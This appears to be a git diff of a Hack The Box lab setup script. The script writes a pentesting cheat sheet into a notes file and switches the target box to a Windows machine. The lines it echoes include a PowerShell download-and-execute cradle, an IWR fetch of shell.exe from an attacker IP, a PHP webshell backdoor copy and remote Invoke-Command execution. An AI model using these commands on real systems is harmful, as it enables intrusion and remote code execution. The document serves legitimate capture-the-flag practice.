@@ -3,12 +3,12 @@
 # set box name, IP and ostype
 #for folder in $(ls /opt/); do cd /opt/$folder/; sudo git pull; done
 
-BOXNAME=Compiled
-LAST=26
-OS=lin
+BOXNAME=Infiltrator
+LAST=
+OS=win
 USER=bob
 
-export IP=10.10.11.$LAST
+export IP=10.129.14.138                      #$LAST
 export HOME=/home/$USER/hackthebox/$BOXNAME          #enter box Name
 export SELF=$(hostname -I | awk '{print $5}')
 export HTB_TOKEN=$(cat /opt/Scripts/.HTB_TOKEN)
@@ -96,6 +96,7 @@ echo "# nikto" >> $HOME/notes
 echo "nikto -h $IP" >> $HOME/notes
 echo "add machine name domain.htb to /etc/hosts (search to ensure named correct)" >> $HOME/notes
 echo "nikto -h domain.htb" >> $HOME/notes
+
 # To fix copy and paste problems in Virtual box
 echo "" >> $HOME/notes
 echo "# when in virtual Machine" >> $HOME/notes
@@ -109,6 +110,7 @@ echo "powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).Download
 echo 'IWR http://10.10.10.10/shell.exe -OutFile shell.exe' >> $HOME/notes
 echo 'cp /usr/share/webshells/php/simple-backdoor.php .' >> $HOME/notes
 echo 'klist,kinit,ksu when you have a tgt or tgs and just kerberos port 88' >> $HOME/notes
+
 # usefull windows stuff.
 echo "" >> $HOME/notes
 echo "# usefull windows tricks" >> $HOME/notes
@@ -117,6 +119,11 @@ echo 'Get-CimInstance -Query "select * from win32_service where Started=True"|fl
 echo 'Expand-Archive xyz.zip' >> $HOME/notes
 echo 'iconv -f utf-16le -t utf-8 lin.log -o lin2.log' >> $HOME/notes
 echo 'Start-Job -FilePath C:\Scripts\Sample.ps1' >> $HOME/notes
+echo "Invoke-Command -Computer dc01 -ScriptBlock { C:\blah.exe } -asJob" >> $HOME/notes
+echo "Invoke-Command -scriptblock { script }  -asJob -computername localhost" >> $HOME/notes
+echo "Start-Job -scriptblock { script }" >> $HOME/notes
+echo "Start-Process powershell {script}" >> $HOME/notes
+
 
 # Windows privesc checklist
 echo "" >> $HOME/notes
